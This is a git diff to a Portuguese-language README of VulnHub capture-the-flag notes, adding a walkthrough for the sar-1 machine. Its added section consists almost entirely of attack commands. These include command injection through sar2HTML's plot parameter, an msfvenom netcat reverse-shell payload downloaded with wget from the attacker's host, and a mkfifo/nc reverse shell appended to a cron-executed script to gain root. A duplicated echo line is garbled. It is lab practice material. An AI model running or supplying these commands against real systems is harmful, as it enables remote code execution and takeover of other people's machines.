@@ -22,7 +22,8 @@ Desafio 19 - Parameter Fuzzing | Password Spray | CVE-2017-16995 - https://www.v
 Desafio 20 - IDT 'perf_swevent_init' Local Privilege Escalation - https://www.vulnhub.com/entry/sumo-1,480/ </br>
 Desafio 21 - Solar Winds Serv-U - CVE-2019-12181 | SQLI into dumpfile - https://www.vulnhub.com/entry/election-1,503/ </br>
 Desafio 22 - Fake GoogleBot | LFI | Misconfiguration | $PATH abuse - https://www.vulnhub.com/entry/inclusiveness-1,422/</br>
-Desafio 23 - - https://www.vulnhub.com/entry/sar-1,425/ </br>
+Desafio 23 - RCE sar2HTML | crontab abuse  - https://www.vulnhub.com/entry/sar-1,425/ </br>
+Desafio 24 - - https://www.vulnhub.com/entry/zico2-1,210/</br>
 <br/>**--VM--**
 
 <br> <h2>[Write-up vídeo](https://www.youtube.com/channel/UCnWSqlqL8D365ps5IECrPyg) </h2></br>
@@ -1057,3 +1058,38 @@ Desafio 23 - - https://www.vulnhub.com/entry/sar-1,425/ </br>
 				cd /home/tom
 				./rootshell
 
+
+
+<h3>Dia 23 			29/9/2020</h3>
+
+	http://ipvm/robots.txt
+		http://ipvm/sar2HTML/index.php?plot=LINUX
+			http://ipvm/sar2HTML/index.php?plot=;uname -a
+			
+	*msfvenom -p cmd/unix/reverse_netcat lhost=kali lport=443 -f raw | beco23.sh
+	
+	*python3 -m http.server
+	http://ipvm/sar2HTML/index.php?plot=;wget http://ipkali:8000/beco23.sh
+	http://ipvm/sar2HTML/index.php?plot=;chmod +x beco23.sh
+	kali: nc -lnvp 443
+	http://ipvm/sar2HTML/index.php?plot=;sh beco23.sh
+
+	*nc
+		wget http://ipkali:8000/pspy-master
+		chmod +x pspy-master
+		./pspy-master
+		
+			#usr/bin/cron -f ....
+				./finally.sh 
+				./write.sh
+			
+			
+			cat beco23.sh ->  mkfifo /tmp/gtadjpa; nc 192.168.100.22 443 0</tmp/gtadjpa | /bin/sh >/tmp/gtadjpa 2>&1; rm /tmp/gtadjpa echo "mkfifo /tmp/gtadjpa; nc 192.168.100.22 443 0</tmp/gtadjpa | /bin/sh >/tmp/gtadjpa 2>&1; rm /tmp/gtadjpa
+			
+			
+		echo "mkfifo /tmp/gtadjpa; nc 192.168.100.22 443 0</tmp/gtadjpa | /bin/sh >/tmp/gtadjpa 2>&1; rm /tmp/gtadjpa echo "mkfifo /tmp/gtadjpa; nc 192.168.100.22 443 0</tmp/gtadjpa | /bin/sh >/tmp/gtadjpa 2>&1; rm /tmp/gtadjpa" >> ../write.sh
+		#sair do nc e esperar nova conexão
+		
+		kali: nc -lnvp 443
+			
+		root
